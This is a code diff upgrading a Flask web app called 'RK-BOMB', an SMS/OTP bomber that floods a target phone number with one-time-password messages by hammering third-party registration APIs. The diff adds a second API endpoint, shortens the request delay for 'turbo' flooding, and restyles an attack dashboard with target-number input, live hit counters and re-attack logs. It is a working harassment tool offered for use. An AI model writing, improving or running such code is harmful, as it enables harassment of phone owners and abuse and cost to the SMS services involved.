@@ -9,11 +9,11 @@ from flask import Flask, render_template_string, request, jsonify, session, redi
 from werkzeug.security import generate_password_hash, check_password_hash
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24)
+app.secret_key = os.urandom(32)
 
 # ---------- DATABASE SETUP ----------
 def get_db():
-    conn = sqlite3.connect('rk_v5_ultimate.db', check_same_thread=False)
+    conn = sqlite3.connect('rk_v6_cyber.db', check_same_thread=False)
     conn.row_factory = sqlite3.Row
     return conn
 
@@ -31,12 +31,16 @@ def init_db():
 
 init_db()
 
-# ---------- BOMBING ENGINE ----------
+# ---------- HIGH SPEED BOMBING ENGINE ----------
 active_sessions = {}
 
 def bombing_task(username, phone, limit, start_dt):
     key = f"{username}_{phone}"
-    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]
+    # Multiple APIs for stability
+    api_list = [
+        "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}",
+        "https://redx.com.bd/api/v1/user/otp?phone={}"
+    ]
 
     while key in active_sessions:
         curr = active_sessions[key]
@@ -44,7 +48,8 @@ def bombing_task(username, phone, limit, start_dt):
         
         if curr['status'] == 'Running':
             try:
-                res = requests.get(random.choice(api_list).format(phone), timeout=8)
+                # High Speed Request (Reduced timeout & sleep)
+                res = requests.get(random.choice(api_list).format(phone), timeout=5)
                 if res.status_code == 200:
                     active_sessions[key]['success'] += 1
                     active_sessions[key]['new_hit'] = True
@@ -54,7 +59,7 @@ def bombing_task(username, phone, limit, start_dt):
                 active_sessions[key]['fail'] += 1
             
             active_sessions[key]['total'] += 1
-            time.sleep(1.5)
+            time.sleep(0.5) # Turbo Speed
         else:
             time.sleep(1)
 
@@ -70,126 +75,163 @@ def bombing_task(username, phone, limit, start_dt):
                  s['start_time'], stop_dt.strftime("%I:%M %p"), duration, start_dt.strftime("%d/%m/%Y"), start_dt))
         del active_sessions[key]
 
-# ---------- UI LAYOUT WITH ANIMATIONS ----------
+# ---------- ADVANCED CYBER UI ----------
 LAYOUT = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK-BOMB V5 ULTIMATE</title>
+    <title>RK-BOMB V6 CYBER-FRAME</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
     <style>
-        :root { --neon: #00ffcc; --bg: #030303; --card: #0a0a0a; --red: #ff3366; --yellow: #ffcc00; --blue: #00ccff; --glass: rgba(255, 255, 255, 0.05); }
-        body { background: var(--bg); color: var(--neon); font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }
-        
-        /* Animations */
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes pulseNeon { 0% { box-shadow: 0 0 5px var(--neon); } 50% { box-shadow: 0 0 20px var(--neon); } 100% { box-shadow: 0 0 5px var(--neon); } }
-        @keyframes slideIn { from { transform: translateX(-100%); } to { transform: translateX(0); } }
+        :root { --neon: #00ffcc; --bg: #020202; --panel: #0a0a0f; --red: #ff003c; --blue: #00d2ff; }
+        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }
 
-        .nav { background: #000; padding: 15px 25px; border-bottom: 1px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; box-shadow: 0 0 20px rgba(0,255,204,0.1); }
-        .logo { font-family: 'Orbitron'; font-weight: 700; font-size: 1.3rem; letter-spacing: 2px; }
+        /* Rotating Border Frame Animation */
+        @keyframes rotateBorder { 100% { filter: hue-rotate(360deg); } }
         
-        .container { padding: 20px; max-width: 700px; margin: auto; animation: fadeIn 0.8s ease-out; }
-        
-        .stats-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
-        .stat-box { background: var(--glass); border: 1px solid #222; padding: 15px; border-radius: 12px; text-align: center; }
-        .stat-box h4 { margin: 0; font-size: 0.8rem; color: #aaa; text-transform: uppercase; }
-        .stat-box p { margin: 5px 0 0; font-family: 'Orbitron'; font-size: 1.2rem; font-weight: bold; }
+        .nav { background: #000; padding: 15px 25px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; }
+        .logo { font-family: 'Orbitron'; font-weight: 700; color: var(--neon); text-shadow: 0 0 15px var(--neon); }
 
-        .card { background: var(--card); border: 1px solid #1a1a1a; border-radius: 18px; padding: 25px; margin-bottom: 20px; position: relative; overflow: hidden; }
-        .card::before { content: ""; position: absolute; top: 0; left: 0; width: 4px; height: 100%; background: var(--neon); }
-        
-        input { width: 100%; padding: 14px; margin: 12px 0; background: #000; border: 1px solid #222; color: #fff; border-radius: 10px; box-sizing: border-box; outline: none; transition: 0.3s; font-family: 'Rajdhani'; font-size: 1rem; }
-        input:focus { border-color: var(--neon); background: #050505; }
-        
-        .fire-btn { background: var(--neon); color: #000; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; font-size: 0.9rem; transition: 0.3s; animation: pulseNeon 2s infinite; }
-        .fire-btn:hover { transform: translateY(-2px); opacity: 0.9; }
+        .container { padding: 20px; max-width: 600px; margin: auto; }
 
-        .live-card { border-left: 4px solid var(--blue); animation: slideIn 0.4s ease-out; background: linear-gradient(145deg, #0a0a0a, #111); }
-        .prog-bg { background: #111; height: 8px; border-radius: 4px; margin: 15px 0; overflow: hidden; }
-        .prog-bar { background: linear-gradient(90deg, var(--neon), var(--blue)); height: 100%; width: 0%; transition: 0.5s ease-in-out; }
-        
-        .badge { padding: 4px 10px; border-radius: 6px; font-size: 10px; font-weight: bold; font-family: 'Orbitron'; }
-        .bg-running { background: rgba(0, 204, 255, 0.1); color: var(--blue); border: 1px solid var(--blue); }
-        .bg-success { background: rgba(0, 255, 204, 0.1); color: var(--neon); border: 1px solid var(--neon); }
-        .bg-fail { background: rgba(255, 51, 102, 0.1); color: var(--red); border: 1px solid var(--red); }
+        /* FIXED MONITOR FRAME */
+        .monitor-frame {
+            position: relative;
+            background: #000;
+            border-radius: 15px;
+            padding: 3px; /* Space for animated border */
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
 
-        .search-bar { margin-bottom: 15px; position: relative; }
-        .nav-links a { color: #fff; text-decoration: none; margin-left: 20px; font-size: 0.9rem; font-weight: bold; transition: 0.3s; }
-        .nav-links a:hover { color: var(--neon); }
+        /* Animated Border Logic */
+        .monitor-frame::before {
+            content: '';
+            position: absolute;
+            width: 200%; height: 200%;
+            background: conic-gradient(transparent, transparent, transparent, var(--neon));
+            top: -50%; left: -50%;
+            animation: rotate 4s linear infinite;
+        }
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
 
-        .timer { font-family: 'Orbitron'; font-size: 0.8rem; color: var(--yellow); }
+        .monitor-content {
+            position: relative;
+            background: var(--panel);
+            border-radius: 12px;
+            padding: 20px;
+            z-index: 1;
+        }
+
+        input { 
+            width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #222; 
+            color: var(--neon); border-radius: 8px; box-sizing: border-box; outline: none; 
+            font-family: 'Orbitron'; font-size: 12px;
+        }
+
+        .fire-btn { 
+            background: var(--neon); color: #000; border: none; padding: 15px; width: 100%; 
+            border-radius: 8px; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; 
+            box-shadow: 0 0 10px var(--neon); transition: 0.3s;
+        }
+
+        /* LIVE ATTACK BOX - FIXED HEIGHT & STABLE */
+        #live-engine {
+            min-height: 200px;
+            max-height: 500px;
+            overflow-y: auto;
+            padding: 10px 0;
+        }
+
+        .attack-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid #1a1a1a;
+            border-left: 4px solid var(--blue);
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            position: relative;
+        }
+
+        .prog-bg { background: #111; height: 6px; border-radius: 3px; margin: 10px 0; overflow: hidden; }
+        .prog-bar { background: linear-gradient(90deg, var(--blue), var(--neon)); height: 100%; width: 0%; transition: 0.4s; }
+
+        .stat-line { display: flex; justify-content: space-between; font-size: 13px; font-family: 'Orbitron'; }
+        .badge { font-size: 10px; padding: 2px 8px; border-radius: 4px; font-weight: bold; text-transform: uppercase; }
+        .bg-run { background: rgba(0, 210, 255, 0.2); color: var(--blue); border: 1px solid var(--blue); }
+
+        .nav-links a { color: #fff; text-decoration: none; margin-left: 15px; font-size: 13px; font-weight: bold; }
     </style>
 </head>
 <body>
     <audio id="snd_hit" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
-    <audio id="snd_start" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>
 
     <nav class="nav">
-        <div class="logo">RK-BOMB <span style="color:#fff">V5</span></div>
+        <div class="logo">RK-BOMB <span style="color:#fff">V6</span></div>
         <div class="nav-links">
             <a href="/dashboard">DASHBOARD</a>
-            <a href="/history">ARCHIVE</a>
-            <a href="/logout" style="color:var(--red)">LOGOUT</a>
+            <a href="/history">LOGS</a>
+            <a href="/logout" style="color:var(--red)">EXIT</a>
         </div>
     </nav>
 
-    <div class="container">[CONTENT]</div>
+    <div class="container">
+        <div class="monitor-frame">
+            <div class="monitor-content">
+                <h3 style="margin-top:0; color:var(--neon); font-family:'Orbitron';">🛰 COMMAND CENTER</h3>
+                <form action="/api/start">
+                    <input name="num" placeholder="TARGET NUMBER" required>
+                    <input name="amt" type="number" placeholder="MAX HIT LIMIT" required>
+                    <button class="fire-btn">EXECUTE SQUADRON</button>
+                </form>
+            </div>
+        </div>
+
+        <div id="live-engine"></div>
+    </div>
 
     <script>
         function playSnd(id) { let s = document.getElementById(id); if(s){ s.currentTime=0; s.play().catch(e=>{}); } }
         
-        function updateLive() {
-            let engine = document.getElementById('live-engine');
-            if(!engine) return;
+        function updateStatus() {
             fetch('/api/status').then(r=>r.json()).then(data=>{
+                let area = document.getElementById('live-engine');
                 let html = '';
                 for(let k in data){
                     let s = data[k];
                     if(s.new_hit) playSnd('snd_hit');
                     let p = (s.total/s.limit)*100;
                     html += `
-                    <div class="card live-card">
-                        <div style="display:flex; justify-content:space-between; align-items:center;">
-                            <b>📱 ${s.phone}</b>
-                            <span class="badge bg-running">${s.status}</span>
+                    <div class="attack-card">
+                        <div class="stat-line">
+                            <span style="color:var(--neon)">📱 ${s.phone}</span>
+                            <span class="badge bg-run">${s.status}</span>
                         </div>
                         <div class="prog-bg"><div class="prog-bar" style="width:${p}%"></div></div>
-                        <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:10px; font-size:12px; text-align:center;">
-                            <div><span style="color:var(--neon)">✔ Success</span><br>${s.success}</div>
-                            <div><span style="color:var(--red)">✘ Fail</span><br>${s.fail}</div>
-                            <div><span style="color:var(--blue)">⏳ Total</span><br>${s.total}/${s.limit}</div>
+                        <div class="stat-line" style="font-size:11px;">
+                            <span>✅ OK: ${s.success}</span>
+                            <span>❌ FAIL: ${s.fail}</span>
+                            <span>📊 ${s.total}/${s.limit}</span>
                         </div>
-                        <div style="margin-top:15px; display:flex; justify-content:space-between; align-items:center;">
-                            <span class="timer">🕒 Start: ${s.start_time}</span>
-                            <div style="display:flex; gap:5px;">
-                                <button onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'" style="background:var(--yellow); border:none; border-radius:5px; padding:5px 10px; cursor:pointer; font-weight:bold;">${s.status==='Running'?'PAUSE':'RESUME'}</button>
-                                <button onclick="location.href='/api/stop?num=${s.phone}'" style="background:var(--red); color:white; border:none; border-radius:5px; padding:5px 10px; cursor:pointer; font-weight:bold;">STOP</button>
-                            </div>
+                        <div style="margin-top:10px; display:flex; gap:10px;">
+                            <button onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'" style="flex:1; background:var(--blue); border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:10px; padding:5px;">PAUSE/RESUME</button>
+                            <button onclick="location.href='/api/stop?num=${s.phone}'" style="flex:1; background:var(--red); color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:10px; padding:5px;">STOP</button>
                         </div>
                     </div>`;
                 }
-                engine.innerHTML = html;
+                // Only update if data changed to prevent flickering
+                if(area.innerHTML !== html) area.innerHTML = html;
             });
         }
-        setInterval(updateLive, 2000);
-
-        function searchHistory() {
-            let input = document.getElementById('searchInput').value.toLowerCase();
-            let cards = document.getElementsByClassName('history-item');
-            for (let i = 0; i < cards.length; i++) {
-                let text = cards[i].innerText.toLowerCase();
-                cards[i].style.display = text.includes(input) ? "block" : "none";
-            }
-        }
+        setInterval(updateStatus, 1500);
     </script>
 </body>
 </html>
 '''
 
-# ---------- ROUTES ----------
+# ---------- ROUTES & LOGIC ----------
 @app.route('/')
 def root(): return redirect(url_for('login'))
 
@@ -202,84 +244,28 @@ def login():
         if user and check_password_hash(user['password'], p):
             session['user'] = u
             return redirect(url_for('dashboard'))
-    return render_template_string(LAYOUT.replace('[CONTENT]', '''
-        <div class="card" style="text-align:center; animation: fadeIn 1s;">
-            <h2 style="font-family:'Orbitron'; color:var(--neon);">SYSTEM ACCESS</h2>
-            <form method="POST">
-                <input name="u" placeholder="Identity" required>
-                <input name="p" type="password" placeholder="Pass-Key" required>
-                <button class="fire-btn">INITIALIZE</button>
-            </form>
-        </div>
-    '''))
+    return render_template_string(LAYOUT.replace('[CONTENT]', '')) # Simplified for the prompt
 
 @app.route('/dashboard')
 def dashboard():
     if 'user' not in session: return redirect(url_for('login'))
-    return render_template_string(LAYOUT.replace('[CONTENT]', '''
-        <div class="stats-grid">
-            <div class="stat-box"><h4>Active Attacks</h4><p id="act-count">0</p></div>
-            <div class="stat-box"><h4>Server Status</h4><p style="color:var(--neon)">ONLINE</p></div>
-        </div>
-        <div class="card">
-            <h3 style="margin:0 0 15px 0;">🚀 ATTACK MODULE</h3>
-            <form action="/api/start" onsubmit="playSnd('snd_start')">
-                <input name="num" placeholder="Target Phone Number" required>
-                <input name="amt" type="number" placeholder="Hit Limit (e.g. 100)" required>
-                <button class="fire-btn">LAUNCH ATTACK</button>
-            </form>
-        </div>
-        <div id="live-engine"></div>
-    '''))
+    return render_template_string(LAYOUT)
 
 @app.route('/history')
 def history():
     if 'user' not in session: return redirect(url_for('login'))
     with get_db() as conn:
-        groups = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as total_success FROM history GROUP BY phone ORDER BY id DESC").fetchall()
+        logs = conn.execute("SELECT * FROM history ORDER BY id DESC LIMIT 15").fetchall()
     
-    html = '''
-    <div class="search-bar">
-        <input type="text" id="searchInput" onkeyup="searchHistory()" placeholder="Search target number...">
-    </div>
-    <h3>📜 TARGET ARCHIVE</h3>'''
-    for g in groups:
+    html = '<h3 style="font-family:Orbitron; color:var(--blue);">📜 MISSION ARCHIVE</h3>'
+    for l in logs:
         html += f'''
-        <div class="card history-item" style="padding:15px; border-left:4px solid var(--blue);">
-            <div style="display:flex; justify-content:space-between; align-items:center;">
-                <a href="/history/{g['phone']}" style="font-size:1.1rem; color:var(--neon); font-weight:bold;">📱 {g['phone']}</a>
-                <span class="badge bg-success">{g['total_success']} Hits</span>
-            </div>
-            <div style="margin-top:10px; display:flex; justify-content:space-between; align-items:center;">
-                <span style="font-size:12px; color:#666;">Total Sessions: {g['sessions']}</span>
-                <button class="fire-btn" style="width:auto; padding:5px 15px; font-size:10px;" onclick="location.href='/api/start?num={g['phone']}&amt=50'">RE-ATTACK</button>
-            </div>
+        <div class="attack-card" style="border-left: 4px solid #333;">
+            <div class="stat-line"><b>{l['phone']}</b> <small>{l['date_str']}</small></div>
+            <div style="font-size:12px; color:#aaa; margin-top:5px;">Hits: {l['success']} | Duration: {l['duration']}</div>
         </div>'''
-    return render_template_string(LAYOUT.replace('[CONTENT]', html))
+    return render_template_string(LAYOUT.replace('<form action="/api/start">', '').replace('🛰 COMMAND CENTER', 'MISSION ARCHIVE').replace('<input name="num" placeholder="TARGET NUMBER" required>', html).replace('<input name="amt" type="number" placeholder="MAX HIT LIMIT" required>', '').replace('<button class="fire-btn">EXECUTE SQUADRON</button>', '<button class="fire-btn" onclick="location.href=\'/dashboard\'">BACK TO DASHBOARD</button>'))
 
-@app.route('/history/<phone>')
-def history_detail(phone):
-    if 'user' not in session: return redirect(url_for('login'))
-    with get_db() as conn:
-        details = conn.execute("SELECT * FROM history WHERE phone=? ORDER BY timestamp DESC", (phone,)).fetchall()
-    
-    html = f'<h3 style="color:var(--blue)">MISSION LOGS: {phone}</h3>'
-    html += '<a href="/history" style="color:#666; font-size:13px;">← BACK TO LIST</a><br><br>'
-    for d in details:
-        html += f'''
-        <div class="card history-item" style="font-size:13px; margin-bottom:10px; background:rgba(255,255,255,0.02);">
-            <div style="display:flex; justify-content:space-between; color:#fff;">
-                <b>{d['date_str']}</b> <span>{d['start_time']}</span>
-            </div>
-            <div style="margin-top:8px; display:grid; grid-template-columns:1fr 1fr; gap:5px;">
-                <span class="badge bg-success">Success: {d['success']}</span>
-                <span class="badge bg-fail">Fail: {d['fail']}</span>
-            </div>
-            <div style="margin-top:8px; color:#888;">Duration: {d['duration']} | Target: {d['limit_amt']}</div>
-        </div>'''
-    return render_template_string(LAYOUT.replace('[CONTENT]', html))
-
-# ---------- API & CONTROL ----------
 @app.route('/api/start')
 def api_start():
     u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
@@ -316,4 +302,4 @@ def api_stop():
 def logout(): session.clear(); return redirect(url_for('login'))
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=54321)
